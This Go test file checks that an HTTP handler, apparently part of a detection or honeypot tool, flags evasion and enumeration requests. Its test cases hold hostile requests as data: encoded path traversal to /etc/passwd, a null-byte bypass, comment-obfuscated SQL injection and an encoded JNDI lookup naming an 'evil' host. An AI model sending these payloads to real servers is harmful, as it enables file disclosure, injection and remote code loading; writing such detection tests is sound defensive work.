package handler

import "testing"

// TestHTTPEvasionDetection exercises the encoding/obfuscation evasion detection
// and the decode-then-rescan path on the base HTTP handler.
func TestHTTPEvasionDetection(t *testing.T) {
	cases := []struct {
		name, req string
		want      []string
	}{
		{
			"double-encoded-traversal",
			"GET /static/..%252f..%252f..%252fetc/passwd HTTP/1.1\r\nHost: x\r\n\r\n",
			[]string{"evasion:double-encoding", "uri-path-traversal", "evasion:encoded-payload"},
		},
		{
			// Overlong-UTF-8 "../" decodes to raw 0xc0 0xae bytes (not ASCII
			// dots), so the encoding artifact itself is the detection signal.
			"overlong-utf8-traversal",
			"GET /a/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n",
			[]string{"evasion:overlong-utf8"},
		},
		{
			"null-byte",
			"GET /download?file=secret.php%00.jpg HTTP/1.1\r\nHost: x\r\n\r\n",
			[]string{"evasion:null-byte"},
		},
		{
			"sql-comment-evasion",
			"GET /item?id=1/**/UNION/**/SELECT/**/1,2,3 HTTP/1.1\r\nHost: x\r\n\r\n",
			[]string{"evasion:sql-comment"},
		},
		{
			"percent-encoded-jndi",
			"GET /?x=%2524%257bjndi%253aldap%253a%252f%252fevil%252fa%257d HTTP/1.1\r\nHost: x\r\n\r\n",
			[]string{"evasion:encoded-payload"},
		},
	}
	for _, c := range cases {
		got := anomaliesOf(serveHTTPOnce(t, c.req))
		for _, w := range c.want {
			if !containsStr(got, w) {
				t.Errorf("%s: expected %q; anomalies=%v", c.name, w, got)
			}
		}
	}
}

// TestHTTPEnumerationDetection covers verb/method + account enumeration.
func TestHTTPEnumerationDetection(t *testing.T) {
	optionsReq := anomaliesOf(serveHTTPOnce(t, "OPTIONS /api HTTP/1.1\r\nHost: x\r\n\r\n"))
	if !containsStr(optionsReq, "http-method-enumeration") {
		t.Errorf("OPTIONS not flagged as method enumeration: %v", optionsReq)
	}
	propfind := anomaliesOf(serveHTTPOnce(t, "PROPFIND /webdav HTTP/1.1\r\nHost: x\r\n\r\n"))
	if !containsStr(propfind, "http-method-enumeration") {
		t.Errorf("PROPFIND not flagged: %v", propfind)
	}
	acct := anomaliesOf(serveHTTPOnce(t, "POST /wp-login.php HTTP/1.1\r\nHost: x\r\nContent-Length: 26\r\n\r\nusername=admin&password=x"))
	if !containsStr(acct, "http-account-enumeration") {
		t.Errorf("login + username param not flagged as account enumeration: %v", acct)
	}

	// A benign GET must not trip evasion/enumeration markers.
	benign := anomaliesOf(serveHTTPOnce(t, "GET /index.html HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0\r\n\r\n"))
	for _, a := range benign {
		if len(a) >= 8 && a[:8] == "evasion:" {
			t.Errorf("benign request flagged %q", a)
		}
		if a == "http-method-enumeration" || a == "http-account-enumeration" {
			t.Errorf("benign request flagged %q", a)
		}
	}
}
